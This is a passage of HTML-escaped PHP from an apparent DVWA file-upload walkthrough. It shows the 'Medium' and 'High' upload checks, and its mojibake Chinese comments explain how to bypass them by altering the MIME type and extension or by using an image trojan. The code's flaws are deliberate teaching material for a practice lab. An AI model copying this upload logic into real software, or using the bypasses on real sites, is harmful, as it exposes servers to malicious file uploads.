&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// No
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Yes!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;medium&#34;&gt;Medium&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Where are we going to be writing to?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DVWA_WEB_PAGE_TO_ROOT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hackable/uploads/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;basename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// File information
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;size&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Is it an image?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// // å¼€å§‹åšäº†ä¸€äº›è¿‡æ»¤
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// ä¸‹é¢æ˜¯å®˜æ–¹å¯¹$_FILES å‡½æ•°çš„æè¿°
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//  [name] =&amp;gt; MyFile.txt (comes from the browser, so treat as tainted)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//         [type] =&amp;gt; text/plain  (not sure where it gets this from - assume the browser, so treat as tainted)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//         [tmp_name] =&amp;gt; /tmp/php/php1h4j1o (could be anywhere on your system, depending on your config        settings, but the user has no control, so this isn&amp;#39;t tainted)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//         [error] =&amp;gt; UPLOAD_ERR_OK  (= 0)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//         [size] =&amp;gt; 123   (the size in bytes)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    
    &lt;span class=&#34;c1&#34;&gt;// å…¶ä¸­å¯¹nameå’Œtypeçš„descriptionçš„æè¿°éƒ½æ˜¯ `treat as tainted`(è¢«æ±¡æŸ“çš„)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// è¿™æ„å‘³ç€å®ƒæœ‰å¯èƒ½ä¼šè¢«ä¿®æ”¹ unsafe
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    
    &lt;span class=&#34;c1&#34;&gt;// æˆ‘ä»¬å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªPHPæ–‡ä»¶ï¼Œä½¿ç”¨ä¸€äº›æ‹¦æˆªè¯·æ±‚å·¥å…·ï¼Œä¿®æ”¹å³å°†å‘å‡ºçš„è¯·æ±‚.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// æ¥è¾¾åˆ°ä¿®æ”¹`name`ä¸­çš„åç¼€åå’Œ`type`ä¸­çš„åª’ä½“ç±»å‹.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;image/jpeg&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;image/png&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100000&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Can we move the file to the upload folder?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// No
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// Yes!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Invalid file
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;high&#34;&gt;High&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Where are we going to be writing to?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DVWA_WEB_PAGE_TO_ROOT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hackable/uploads/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;basename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// File information
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// jpg
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strrpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    
    &lt;span class=&#34;c1&#34;&gt;// file size
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;size&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    
    &lt;span class=&#34;c1&#34;&gt;// tmp_name æ˜¯ä¸´æ—¶å‰¯æœ¬çš„åå­—
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;// Is it an image?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// å’Œä¸Šé¢çš„æ¯”èµ·æ¥å¤šä¸ªä¸€ä¸ªæ–‡ä»¶åç¼€åçš„åˆ¤æ–­.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// strtolower è½¬å°å†™
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// æ‰©å±•ååªè¦æ»¡è¶³jpeg,pngæˆ–è€…jpgå°±è¡Œ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;jpeg&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_ext&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;png&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100000&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// getimagesize è·å–å›¾åƒä¿¡æ¯
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// è¿™ä¸ªå‡½æ•°ä¿è¯ä½ ç©¿çš„ä¸€å®šå¾—æ˜¯ä¸ªå›¾åƒ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// å¯ä»¥ç”¨å›¾ç‰‡æœ¨é©¬ç»•è¿‡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;getimagesize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// Can we move the file to the upload folder?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uploaded_tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// No
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// Yes!
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// Invalid file
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;high-1&#34;&gt;High&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// Where are we going to be writing to?
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DVWA_WEB_PAGE_TO_ROOT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hackable/uploads/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$target_path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;basename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;][&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

